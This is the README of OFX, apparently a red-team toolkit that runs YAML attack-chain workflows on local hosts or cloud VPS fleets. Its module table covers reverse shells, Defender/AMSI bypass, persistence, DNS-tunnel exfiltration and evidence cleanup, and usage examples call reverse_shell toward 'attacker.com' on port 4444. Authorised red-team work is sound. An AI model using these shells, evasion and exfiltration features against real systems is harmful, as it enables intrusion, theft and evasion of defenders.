# Offensive Flow Executor (OFX)

Advanced red team automation toolkit for composing complex attack chains with YAML workflows. Parallel jobs, Jinja2 templating, cloud execution, and 96+ built-in API modules for recon, exploitation, and post-exploitation.

**Docs:** [anhhung04.github.io/ofx](https://anhhung04.github.io/ofx/)

---

## Table of Contents

- [Installation](#installation)
- [Quick Start](#quick-start)
- [Workflow Syntax](#workflow-syntax)
  - [Jobs and Dependencies](#jobs-and-dependencies)
  - [Step Types](#step-types)
  - [Inputs and Templating](#inputs-and-templating)
  - [Outputs and Data Passing](#outputs-and-data-passing)
  - [Matrix Strategy](#matrix-strategy)
  - [Conditional Execution](#conditional-execution)
  - [Error Handling and Retries](#error-handling-and-retries)
- [Cloud Execution](#cloud-execution)
  - [Cloud Profiles](#cloud-profiles)
  - [Multi-Cloud Workflows](#multi-cloud-workflows)
  - [Fleet Distribution](#fleet-distribution)
- [Sessions (Detached Execution)](#sessions-detached-execution)
- [Built-in API Modules](#built-in-api-modules)
- [Secrets Management](#secrets-management)
- [Collections](#collections)
- [Project Management](#project-management)
- [CLI Reference](#cli-reference)
- [Configuration](#configuration)
- [Development](#development)
- [Contributing](#contributing)
- [License](#license)

---

## Installation

**Requirements:** Python 3.14+ (supports free-threaded/no-GIL builds)

```bash
# Recommended: install with uv
uv tool install ofx

# Or with pip
pip install ofx

# With cloud provider support
pip install "ofx[cloud]"          # AWS + DigitalOcean
pip install "ofx[digitalocean]"   # DigitalOcean only
pip install "ofx[aws]"            # AWS only

# With optional backends
pip install "ofx[redis]"          # Redis registry backend
pip install "ofx[memcached]"      # Memcached registry backend
pip install "ofx[winrm]"          # Windows Remote Management
```

### From Source

```bash
git clone https://github.com/anhhung04/ofx.git
cd ofx
uv sync --extra test
uv run ofx --help
```

### Virtualenv / uv Import Tip

If you install from source in a venv or with `uv` and want `python` to import `ofx` without editable installs, drop a `.pth` file pointing at the repo `src` directory:

```bash
python3 - <<'PY'
import sysconfig, pathlib, subprocess, os
uv_tool_dir = subprocess.check_output(["uv", "tool", "dir"]).strip().decode()
tool_python_path = pathlib.Path(uv_tool_dir) / "ofx" / "bin" / "python"
tool_module_path = subprocess.check_output([tool_python_path, "-c", "import ofx; print(ofx.__path__[0])"]).strip().decode()
print(f"OFX module path: {tool_module_path}")
tool_modules_dir = pathlib.Path(tool_module_path).parent
tool_modules_dir.mkdir(parents=True, exist_ok=True)
try:
  pth_dir = pathlib.Path(sysconfig.get_paths()["purelib"])
  pth_dir.mkdir(parents=True, exist_ok=True)
  (pth_dir / "ofx.pth").write_text(str(tool_modules_dir))
except Exception as e:
  print(f"Error writing .pth file: {e}")
  print(f"Write to {os.environ['HOME']}/.local/lib/python{sysconfig.get_python_version()}/site-packages/ofx.pth with content: {tool_modules_dir}")
else:
  print(f"Wrote .pth file to {pth_dir/'ofx.pth'} pointing to {tool_modules_dir}")
PY
```

---

## Quick Start

Create a workflow and run it:

```bash
cat << 'EOF' > hello.yml
name: hello-ofx
jobs:
  hello:
    steps:
      - name: Greet
        run: echo "Hello from OFX!"

      - name: System Info
        run: |
          echo "Host: $(hostname)"
          echo "User: $(whoami)"
          echo "Date: $(date)"
EOF

ofx flow run hello.yml
```

Scaffold a new workflow with IDE schema support:

```bash
ofx flow init my-workflow
# Creates my-workflow.yml with yaml-language-server schema comment
```

Generate the JSON schema for IDE autocompletion:

```bash
ofx flow schema schema
# Writes ~/.ofx/workflow_schema.json
```

---

## Workflow Syntax

Workflows are YAML files with a `name`, optional `dispatch` for inputs, and a `jobs` map.

```yaml
# yaml-language-server: $schema=~/.ofx/workflow_schema.json
name: Example Workflow
description: Demonstrates core OFX features

dispatch:
  inputs:
    target:
      required: true
      description: Target IP or hostname
    wordlist:
      required: false
      description: Path to wordlist

env:
  THREADS: "10"

jobs:
  recon:
    steps:
      - name: Port scan
        run: nmap -sV {{ inputs.target }}
```

### Jobs and Dependencies

Jobs run in parallel by default. Use `needs` to define execution order:

```yaml
jobs:
  setup:
    steps:
      - run: echo "Setting up environment"

  build:
    needs: setup           # Waits for setup to complete
    steps:
      - run: echo "Building"

  test:
    needs: build
    steps:
      - run: echo "Testing"

  deploy:
    needs: [build, test]   # Waits for both
    steps:
      - run: echo "Deploying"
```

OFX performs topological sorting and runs independent jobs in parallel stages via `asyncio`.

### Step Types

Each step must specify exactly one run type:

**Shell command** (`run`):
```yaml
- name: Run a shell command
  run: echo "Hello"
  shell: /bin/bash           # Optional, defaults to /bin/bash
  working-directory: /tmp    # Optional working directory
```

**Inline Python** (`script`):
```yaml
- name: Inline Python script
  script: |
    import os
    print(f"Running as {os.getlogin()}")
    targets = ["10.0.0.1", "10.0.0.2"]
    for t in targets:
        print(f"Scanning {t}")
```

**Python file** (`script_file`):
```yaml
- name: Run Python file
  script_file: ./scripts/scanner.py
```

**Subworkflow** (`uses`):
```yaml
- name: Run another workflow
  uses: ./recon-workflow
```

When running on cloud VPS, `script` and `script_file` steps automatically bundle any `ofx.api` imports into a self-extracting archive that runs on the remote host without installing OFX.

### Inputs and Templating

OFX uses Jinja2 templating throughout workflows. Templates are resolved at runtime.

**Passing inputs from CLI:**
```bash
ofx flow run scan.yml -i target=10.0.0.1 -i ports=80,443
```

**Using inputs in workflows:**
```yaml
dispatch:
  inputs:
    target:
      required: true

jobs:
  scan:
    steps:
      - run: nmap {{ inputs.target }}
```

**Built-in template functions:**

| Function | Description |
|----------|-------------|
| `{{ file_read('/path/to/file') }}` | Read file contents |
| `{{ file_write('/path', 'content') }}` | Write file |
| `{{ file_exists('/path') }}` | Check if file exists |
| `{{ env.VARIABLE }}` | Access environment variables |
| `{{ secrets.API_KEY }}` | Access stored secrets |
| `{{ inputs.name }}` | Access workflow inputs |
| `{{ matrix.key }}` | Access matrix variable |
| `{{ jobs.job_id.outputs.key }}` | Access job outputs |
| `{{ steps.N.outputs.key }}` | Access step outputs (by index) |
| `{{ platform }}` | Current OS platform |
| `{{ is_windows }}` | Boolean OS check |
| `{{ channel_send(name, data) }}` | Inter-step communication |
| `{{ channel_recv(name) }}` | Receive channel data |

All 96+ API modules are also injected into the template context.

### Outputs and Data Passing

Steps can capture outputs for use by downstream jobs:

```yaml
jobs:
  recon:
    outputs:
      target_ip: "{{ steps.0.outputs.target_ip }}"
      open_ports: "{{ steps.0.outputs.open_ports }}"
    steps:
      - name: Discover targets
        run: |
          echo "target_ip=10.0.0.5" >> $OFX_OUTPUTS
          echo "open_ports=22,80,443" >> $OFX_OUTPUTS

  exploit:
    needs: recon
    steps:
      - name: Use discovered data
        run: |
          echo "Targeting: {{ jobs.recon.outputs.target_ip }}"
          echo "Ports: {{ jobs.recon.outputs.open_ports }}"
```

### Matrix Strategy

Run a job across multiple combinations of variables:

```yaml
jobs:
  scan:
    name: "Scan {{ matrix.target }} with {{ matrix.tool }}"
    strategy:
      matrix:
        target: [10.0.0.1, 10.0.0.2, 10.0.0.3]
        tool: [nmap, masscan]
      max_parallel: 4        # Limit concurrency
      fail_fast: true        # Stop all on first failure
      exclude:               # Skip specific combinations
        - target: 10.0.0.3
          tool: masscan
      include:               # Add extra combinations
        - target: 192.168.1.1
          tool: nmap
          extra_flags: "-A"
    steps:
      - run: echo "Running {{ matrix.tool }} against {{ matrix.target }}"
```

### Conditional Execution

Control step execution with `if`:

```yaml
steps:
  - name: Always runs
    run: echo "step 1"

  - name: Only on success
    if: success()
    run: echo "Previous step succeeded"

  - name: Only on failure
    if: failure()
    run: echo "Previous step failed"
    continue-on-error: true
```

### Error Handling and Retries

```yaml
steps:
  - name: Flaky operation
    run: curl -f http://target/api/endpoint
    retry: 3                    # Retry up to 3 times
    retry-delay: 10             # Wait 10 seconds between retries
    timeout: 5                  # Timeout after 5 minutes
    continue-on-error: true     # Don't fail the job on error
```

---

## Cloud Execution

Run jobs on provisioned VPS instances. Supports AWS EC2, DigitalOcean Droplets, and static (pre-existing) hosts.

### Cloud Profiles

Store reusable cloud configurations in `~/.ofx/cloud.yml`:

```bash
# Add a profile
ofx cloud profile add do-nyc \
  --provider digitalocean \
  --region nyc1 \
  --size s-1vcpu-1gb \
  --image ubuntu-24-04-x64 \
  --ssh-key ~/.ssh/id_ed25519

# Add an AWS profile
ofx cloud profile add aws-east \
  --provider aws \
  --region us-east-1 \
  --size t3.medium \
  --image ami-0abcdef1234567890 \
  --ssh-key ~/.ssh/aws_key

# List profiles
ofx cloud profile list

# Set default
ofx cloud profile default do-nyc
```

Use profiles in workflows:

```yaml
jobs:
  remote-scan:
    cloud: do-nyc          # Reference by profile name
    steps:
      - run: nmap -sV target.com
```

Or use inline cloud configuration:

```yaml
jobs:
  remote-scan:
    cloud:
      provider: digitalocean
      region: nyc1
      size: s-2vcpu-4gb
      image: ubuntu-24-04-x64
      ssh_key: ~/.ssh/id_ed25519
      opsec_mode: true       # Execute via temp files
      auto_destroy: true     # Destroy VPS when done
    steps:
      - run: nmap -sV target.com
```

### Multi-Cloud Workflows

Different jobs in the same workflow can use different cloud providers:

```yaml
jobs:
  recon:
    cloud: do-nyc                    # DigitalOcean
    steps:
      - run: nmap -sV target.com

  exploit:
    cloud:
      provider: aws
      region: us-east-1
      size: t3.medium
    needs: [recon]
    steps:
      - run: ./exploit.sh

  local-report:                      # No cloud = runs locally
    needs: [exploit]
    steps:
      - run: echo "Generating report"
```

### Fleet Distribution

Distribute targets across multiple VPS instances:

```yaml
jobs:
  mass-scan:
    cloud: do-nyc
    strategy:
      matrix:
        port: [80, 443]
      fleet:
        count: 5                        # Provision 5 VPS
        input: "10.0.0.0/24"            # Targets to distribute
        distribution: chunk             # chunk | round-robin | subnet | line
        expand_cidrs: true              # Expand CIDR to individual IPs
        exclude: ["10.0.0.1"]           # Skip specific IPs
    steps:
      - run: |
          echo "Scanning port {{ matrix.port }}"
          cat $FLEET_INPUT_FILE | xargs -I{} nmap -p{{ matrix.port }} {}
```

Fleet input accepts IPs, CIDR ranges, hostnames, or file paths. `$FLEET_INPUT_FILE` is uploaded to each VPS with its chunk of targets.

---

## Sessions (Detached Execution)

Fire-and-forget workflow execution with status polling and result retrieval:

```bash
# Submit a workflow (runs in background)
ofx session submit workflow.yml --cloud do-nyc

# List active sessions
ofx session list

# Check status
ofx session status <session-id>

# Stream logs
ofx session logs <session-id> --tail 100

# Fetch results (with optional encryption)
ofx session fetch <session-id> --passphrase secret

# Cleanup
ofx session cancel <session-id>
ofx session destroy <session-id>
ofx session clean --older-than 7d
```

Sessions support both LOCAL (background subprocess) and CLOUD (provisioned VPS) targets. Results are encrypted at rest with AES-256-CBC + PBKDF2.

---

## Built-in API Modules

OFX ships with 96+ modules accessible in `run:` fields via Jinja2 templates and in `script:` steps via Python imports.

| Category | Modules | Description |
|----------|---------|-------------|
| **recon** | portscan, osint, web | Port scanning, OSINT, web fingerprinting |
| **exploitation** | http, shellcode, webshell | HTTP exploits, shellcode generation, webshells |
| **post** | ssh, winrm, smbexec, wmiexec | Remote execution backends |
| **privesc** | linux, windows | Privilege escalation helpers |
| **lateral** | lateral | Lateral movement techniques |
| **ad** | enum, kerberos, execution | Active Directory enumeration and attacks |
| **c2** | c2 | Reverse shells (python/perl/ruby/php/socat/java), msfvenom |
| **persistence** | persistence | Crontab, systemd, bashrc, SSH keys, motd |
| **evasion** | bypass | AMSI, ETW, Defender bypass snippets |
| **exfil** | dns, http, pipeline | Data exfiltration via DNS tunneling, HTTP, compression |
| **opsec** | proxy, cleanup, timing, traffic | Proxy chains, evidence cleanup, traffic blending |
| **creds** | creds | Credential handling and extraction |
| **dns** | dns | DNS enumeration and manipulation |
| **oob** | oob | Out-of-band testing (Interactsh, CEye) |
| **packers** | packers | Payload encoding and packing |
| **payloads** | payloads | Payload generation |
| **search** | search | Search engine dorking |
| **network** | network | Network utilities |
| **http** | http | HTTP client helpers |
| **httpserver** | httpserver | Payload hosting with SSL |
| **file** | file | File operation utilities |
| **strings** | strings | String manipulation |
| **data** | data | Data processing utilities |
| **loot** | loot | Loot collection and organization |
| **bundle** | analyzer, collector, builder | Script bundling for remote execution |

**Using APIs in templates:**
```yaml
steps:
  - run: "{{ reverse_shell('bash', '10.0.0.1', 4444) }}"
  - run: "{{ nmap_scan('10.0.0.0/24', ports='1-1000') }}"
```

**Using APIs in scripts:**
```yaml
steps:
  - script: |
      from ofx.api.recon.portscan import nmap_scan
      from ofx.api.c2 import reverse_shell
      print(nmap_scan("10.0.0.1"))
      print(reverse_shell("bash", "attacker.com", 4444))
```

Browse available APIs:
```bash
ofx api show --list              # List all modules
ofx api show -m c2               # Show c2 module details
ofx api show -m c2 -f reverse_shell  # Show specific function
```

---

## Secrets Management

Encrypted secret storage with backup and restore:

```bash
# Store a secret
ofx secret set API_KEY --value "sk-abc123"
ofx secret set DB_PASS                     # Interactive prompt
ofx secret set SSH_KEY --file ~/.ssh/id_rsa

# Retrieve
ofx secret get API_KEY --show

# List and search
ofx secret list
ofx secret search "API_*"

# Backup and restore
ofx secret backup -o backup.enc
ofx secret restore backup.enc --dry-run

# Import/export
ofx secret export -o secrets.json
ofx secret import secrets.json
```

Use secrets in workflows:

```yaml
jobs:
  deploy:
    steps:
      - run: curl -H "Authorization: Bearer {{ secrets.API_KEY }}" https://api.example.com
```

---

## Collections

Install and manage reusable workflow packages:

```bash
# Install from git
ofx flow collection add https://github.com/org/recon-workflows.git

# List installed
ofx flow collection list

# Search community index
ofx flow collection search recon

# Update all
ofx flow collection update

# Remove
ofx flow collection remove recon-workflows
```

Installed collections are automatically added to the workflow search path. Reference them by name:

```bash
ofx flow run collection-workflow-name
```

---

## Project Management

Organize red team engagements into projects:

```bash
# Create a project
ofx project init operation-sunrise
ofx project init operation-sunrise --multiphase

# List projects
ofx project list

# Import from git
ofx project import https://github.com/org/engagement.git

# Sync to remote storage
ofx project sync operation-sunrise --remote-type git --encrypt

# Remove
ofx project remove operation-sunrise
```

Run workflows scoped to a project:

```bash
ofx flow run recon.yml --project operation-sunrise
# Output goes to <project>/logs, project vars are exposed
```

---

## CLI Reference

```
ofx [OPTIONS] COMMAND

Options:
  -e, --env KEY=VAL    Inject environment variable (repeatable)

Commands:
  flow      Manage and run workflows (aliases: x, task)
  cloud     Manage cloud profiles, instances, and images
  session   Manage detached job sessions (local & cloud)
  project   Manage Red Team projects
  api       Display OFX API reference
  secret    Manage secrets for workflows
```

### Key Commands

| Command | Description |
|---------|-------------|
| `ofx flow run <workflow> [options]` | Execute a workflow |
| `ofx flow validate <workflow>` | Validate workflow YAML |
| `ofx flow init <name>` | Scaffold a new workflow |
| `ofx flow schema schema` | Export JSON schema for IDE support |
| `ofx flow tools <workflow>` | Install workflow tool dependencies |
| `ofx flow collection add <url>` | Install a workflow collection |
| `ofx cloud profile add <name>` | Add a cloud provider profile |
| `ofx cloud test <profile>` | Test cloud connectivity |
| `ofx cloud fleet run <profile>` | Run a fleet operation |
| `ofx session submit <workflow>` | Submit for detached execution |
| `ofx secret set <name>` | Store a secret |
| `ofx project init <name>` | Create a new project |
| `ofx api show --list` | Browse built-in API modules |

### Run Options

```bash
ofx flow run workflow.yml \
  -i target=10.0.0.1 \
  -i wordlist=/usr/share/wordlists/common.txt \
  -o ./output \
  -p my-project \
  --profile \
  --durable \
  --resume \
  --log-format json \
  --quiet \
  --lock /tmp/ofx.lock \
  --wait-lock 30
```

| Flag | Description |
|------|-------------|
| `-i, --input` | Input parameters (KEY=VAL, repeatable) |
| `-o, --output` | Output directory |
| `-p, --project` | Run scoped to a project |
| `--profile` | Enable performance profiling |
| `--durable / --no-durable` | Enable checkpoint-based durable execution |
| `--resume / --no-resume` | Resume from last checkpoint |
| `--durable-backend` | Checkpoint backend: `file` or `redis` |
| `--log-format` | Output format: `rich`, `json`, or `text` |
| `--quiet` | Suppress interactive output (headless/cron mode) |
| `--lock` | Lock file path to prevent overlapping runs |
| `--wait-lock` | Seconds to wait for lock before failing |

---

## Configuration

### Paths

| Path | Description |
|------|-------------|
| `~/.ofx/` | Runtime data directory |
| `~/.ofx/cloud.yml` | Cloud provider profiles |
| `~/.ofx/sessions/` | Session data and results |
| `~/.ofx/secrets/` | Encrypted secrets store |
| `~/.ofx/workflows/` | Default workflow search path |
| `~/.ofx/collections/` | Installed workflow collections |
| `~/.ofx/workflow_schema.json` | JSON schema for IDE support |

### Environment Variables

| Variable | Description |
|----------|-------------|
| `OFX_DEBUG=1` | Enable debug mode with full tracebacks |
| `OFX_GITHUB_TOKEN` | GitHub token for private collections |
| `OFX_SECRETS_STORE` | Override secrets store path |
| `OFX_SECRETS_DIR` | Override secrets directory path |
| `OFX_REGISTRY_BACKEND` | Job registry: `memory`, `file`, `redis`, `memcached`, `etcd` |

All settings can be set via environment variables prefixed with `OFX_`. See `src/ofx/settings.py` for the full list.

---

## Development

```bash
# Clone and install
git clone https://github.com/anhhung04/ofx.git
cd ofx
uv sync --extra test

# Run all tests
uv run pytest

# Run a single test
uv run pytest tests/test_flowrun.py::test_name -v

# Run with coverage
uv run pytest --cov=src/ofx --cov-report=term-missing

# Lint and format
uv run ruff check src/
uv run ruff check --fix src/
uv run ruff format src/

# Type check
uv run mypy src/
```

### Architecture

```
CLI (typer) --> Models (Pydantic v2) --> Runner (async) --> Registry
                                           |
                              WorkflowRunner --> WorkflowScheduler
                                   |                    |
                              JobRunner          Topological sort +
                                   |             parallel dispatch
                              StepRunner
                                   |
                         CommandExecutor / ScriptExecutor
```

- **CLI:** Thin `@app.command()` functions delegate to handler classes (lazy-imported)
- **Models:** Pydantic v2 with YAML kebab-case aliases (`continue-on-error`, `retry-delay`)
- **Runner:** Async state machine (`IDLE -> RUNNING -> FINISHED -> COMPLETED/FAILED`)
- **Registry:** Pluggable output storage (memory/file/Redis/Memcached/etcd) with caching and failover
- **Templates:** Jinja2 resolver with 96+ API modules injected into the evaluation context
- **Cloud:** Provider registry with decorator-based registration, SSH/WinRM remote execution

---

## Contributing

PRs welcome. Use semantic commit messages. See the [docs](https://anhhung04.github.io/ofx/) for development setup.

## License

See `LICENSE` for details.
